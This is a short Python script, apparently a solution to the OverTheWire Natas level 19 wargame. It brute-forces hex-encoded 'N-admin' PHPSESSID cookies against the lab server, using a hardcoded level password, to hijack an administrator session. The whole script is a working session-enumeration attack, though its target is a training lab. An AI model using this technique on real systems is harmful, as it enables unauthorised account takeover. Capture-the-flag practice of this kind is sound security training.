import requests, time


user = "natas19"
password ="4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
sess_id = 1
payload = {'username': '1', 'password': '1'}

for x in range(1, 641):
    b_string = "{}-admin".format(x).encode('utf-8')
    cookie = dict(PHPSESSID=b_string.hex())
    req = requests.post('http://natas19.natas.labs.overthewire.org/index.php?debug=true',
             auth = (user, password),
             cookies = cookie,  
             )

    print("PHPSESSID is currently: {}".format(cookie['PHPSESSID']))
    if(b'You are an admin.' in req.content):
        print(req.content)


